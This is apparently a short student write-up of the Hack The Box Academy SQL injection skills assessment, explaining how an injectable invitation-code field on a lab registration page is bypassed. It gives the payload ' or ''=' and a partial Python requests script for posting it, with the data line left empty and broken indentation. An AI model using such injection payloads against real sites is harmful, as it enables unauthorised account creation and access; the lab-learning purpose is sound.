## Purpose:

This writeup detalis how to solve the Skills Assessment for the SQL Injection Fundamentals module from Hack THe Box Acadmey.

## Getting Started:

After starting the target, and pasting the ip in the browser youll notice that that the page doesnt load.

- You'll need to ignore the SSL Certificate to go to the page.

Once you are at the webpage click on the "create account" tab navigate to register.php.

- The form will not let you create an account without an "invitation code".

  - However the name="invitationCode" param is vulnerable to an SQL injection.

    - You can bypass the requirment with requests: ' or ''='
   
    - The browser will not let you exploit the form, but using requests.post() or a proxy like Burp Suite can be used to creat an account.

          import requests
   
          data = 
          headers = {
            "Content-Type": "application/x-www-form-urlencoded"
          }
          
          # POST request
          r = requests.post(
              url=url,
              headers=headers,
              data=data,
              cookies={'PHPSESSID': '<cookie>'},
              verify=False,
              allow_redirects=False
          )

          # Responce
					print('\n***** Response *****')
					print(f'Status Code: {r.status_code} {r.reason}')
					for k, v in r.headers.items():
					  print(f'{k}: {v}')
					print(f'Response-Length: {len(r.content):,}\n') 



